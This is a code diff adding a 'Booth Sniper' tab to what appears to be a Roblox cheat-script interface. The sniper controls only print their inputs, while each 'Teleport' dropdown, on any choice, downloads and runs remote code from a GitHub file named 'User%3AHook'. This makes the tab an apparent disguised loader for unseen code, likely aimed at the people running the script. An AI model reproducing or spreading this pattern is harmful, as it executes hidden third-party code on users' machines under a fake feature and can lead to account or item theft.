@@ -567,6 +567,105 @@ Pets:AddButton({
   	end    
 })
 
+-- Booth
+
+local Booth = Window:MakeTab({
+	Name = "Booth",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local BoothSection = Booth:AddSection({
+	Name = "🛒Booth Sniper"
+})
+
+Booth:AddDropdown({
+	Name = "Teleport",
+	Default = "1",
+	Options = {"Any", "Huge", "Exclusive", "Mythical", "Legendary", "Epic", "Rare", "Basic"},
+	Callback = function(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+	end    
+})
+
+Booth:AddDropdown({
+	Name = "Teleport",
+	Default = "1",
+	Options = {"Any", "Normal", "Golden", "Rainbow", "Dark Matter"},
+	Callback = function(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+	end    
+})
+
+Booth:AddDropdown({
+	Name = "Teleport",
+	Default = "1",
+	Options = {"Any", "Hardcore", "Normal"},
+	Callback = function(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+	end    
+})
+
+Booth:AddTextbox({
+	Name = "Pet Name or ID",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+Booth:AddTextbox({
+	Name = "Type Price",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+Booth:AddTextbox({
+	Name = "Webhook URL (Optional)",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+Booth:AddToggle({
+	Name = "Ignore Hell Rock",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Booth:AddToggle({
+	Name = "Start/Stop Booth Snipe",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Booth:AddToggle({
+	Name = "Start Server Hop",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Booth:AddTextbox({
+	Name = "Server Hop Time (in mins)",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
 -- Misc/World
 local World = Window:MakeTab({
 	Name = "World",
